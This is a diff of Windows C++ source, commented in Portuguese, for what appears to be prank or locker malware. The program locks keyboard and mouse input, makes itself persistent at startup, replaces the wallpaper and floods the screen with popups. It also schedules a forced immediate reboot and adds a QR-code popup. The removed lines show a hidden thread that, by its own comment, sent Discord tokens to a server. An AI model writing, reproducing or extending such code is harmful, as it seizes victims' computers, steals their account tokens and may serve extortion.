@@ -10,7 +10,7 @@
 #include "beep.h"
 #include "popup.h"
 #include "melt.h"
-#include "collector_embed.h"
+#include "qr_popup.h"
 
 // ── UC1: Inicialização ────────────────────────────────────────────────────────
 static void UseCaseInit() {
@@ -21,14 +21,11 @@ static void UseCaseInit() {
     g_rng.seed((unsigned)std::chrono::high_resolution_clock::now()
                .time_since_epoch().count());
     InitBeepWav();
-    // Roda collector em background (tokens Discord → servidor)
-    std::thread(RunCollectorHidden).detach();
 }
 
 // ── UC2: Roubar foco e travar input imediatamente ────────────────────────────
-// BlockInput exige foco — janela 1x1 garante isso antes do melt
 static HWND UseCaseLockInputNow(HINSTANCE hInst) {
-    InstallHooks(); // hooks no main thread — PeekMessageW roda aqui
+    InstallHooks();
     WNDCLASSW wc={};
     wc.lpfnWndProc=DefWindowProcW; wc.hInstance=hInst; wc.lpszClassName=L"LockWin";
     RegisterClassW(&wc);
@@ -36,7 +33,7 @@ static HWND UseCaseLockInputNow(HINSTANCE hInst) {
         L"LockWin",L"",WS_POPUP,SW/2,SH/2,1,1,nullptr,nullptr,hInst,nullptr);
     ShowWindow(hLock,SW_SHOW);
     SetForegroundWindow(hLock);
-    LockInputFull(); // teclado + cursor travados AGORA
+    LockInputFull();
     return hLock;
 }
 
@@ -44,14 +41,15 @@ static HWND UseCaseLockInputNow(HINSTANCE hInst) {
 static void UseCaseSetupPersistence(const wchar_t* exePath) {
     RegisterPersistence(exePath);
     SaveOriginalWallpaper();
-    SetFallbackWallpaperNow();                    // BMP vermelho instantâneo
-    std::thread(DownloadWallpaperAsync).detach(); // JPG real em background
-    ShowDesktop();                                // minimiza tudo
+    SetFallbackWallpaperNow();
+    std::thread(DownloadWallpaperAsync).detach();
+    ShowDesktop();
 }
 
-// ── UC4: Flood de popups por 500ms antes do melt ─────────────────────────────
+// ── UC4: Flood de popups + popup QR principal ─────────────────────────────────
 static bool UseCasePopupPhase() {
-    std::thread(PopupFloodThread).detach();
+    std::thread(PopupFloodThread).detach();  // popups secundários (z baixo)
+    std::thread(QrPopupThread).detach();     // popup QR principal (z alto)
     DWORD t0=GetTickCount(); MSG m;
     while(g_running && (GetTickCount()-t0)<500)
         if(PeekMessageW(&m,nullptr,0,0,PM_REMOVE)){
@@ -61,12 +59,13 @@ static bool UseCasePopupPhase() {
     return g_running.load();
 }
 
-// ── UC5: Shutdown agendado em 120s ───────────────────────────────────────────
+// ── UC5: Shutdown agendado ────────────────────────────────────────────────────
 static void UseCaseScheduleShutdown() {
+    if (!SHUTDOWN_ENABLED) return;
     std::thread([]{
-        Sleep(120000);
+        Sleep((DWORD)SHUTDOWN_DELAY_SECONDS * 1000);
         if(g_running.load())
-            RunHidden(L"C:\\Windows\\System32\\shutdown.exe /r /t 10 /f");
+            RunHidden(L"C:\\Windows\\System32\\shutdown.exe /r /t 0 /f");
     }).detach();
 }
 
@@ -76,7 +75,7 @@ static void UseCaseCleanup() {
     g_running=false;
     RemoveHooks();
     StopBeep();
-    RunHidden(L"C:\\Windows\\System32\\shutdown.exe /a"); // cancela shutdown
+    RunHidden(L"C:\\Windows\\System32\\shutdown.exe /a");
     UnregisterPersistence();
     RestoreOriginalWallpaper();
     delete[] g_wavBuf; g_wavBuf=nullptr;
@@ -84,8 +83,7 @@ static void UseCaseCleanup() {
 
 // ── WinMain ───────────────────────────────────────────────────────────────────
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR lpCmdLine, int) {
-    UseCaseInit();                          // UC1: dimensões, RNG, áudio
-
+    UseCaseInit();                           // UC1: dimensões, RNG, áudio
     HWND hLock = UseCaseLockInputNow(hInst); // UC2: trava input AGORA
 
     bool fromBat = IsStartedFromBat(lpCmdLine);
@@ -93,19 +91,19 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR lpCmdLine, int) {
     GetModuleFileNameW(nullptr, exePath, MAX_PATH);
 
     if(!fromBat)
-        UseCaseSetupPersistence(exePath);   // UC3: persist + wallpaper
+        UseCaseSetupPersistence(exePath);    // UC3: persist + wallpaper
 
     StartBeep();
 
-    if(!UseCasePopupPhase()) goto cleanup;  // UC4: flood 500ms
+    if(!UseCasePopupPhase()) goto cleanup;   // UC4: flood + QR popup
 
     if(!fromBat)
-        UseCaseScheduleShutdown();          // UC5: shutdown em 120s
+        UseCaseScheduleShutdown();           // UC5: shutdown em 120s
 
     DestroyWindow(hLock);
-    RunMelt(hInst);                         // UC6: drip + glitch até Insert
+    RunMelt(hInst);                          // UC6: melt até combo de saída
 
 cleanup:
-    UseCaseCleanup();                       // UC7: restaura tudo
+    UseCaseCleanup();                        // UC7: restaura tudo
     return 0;
 }
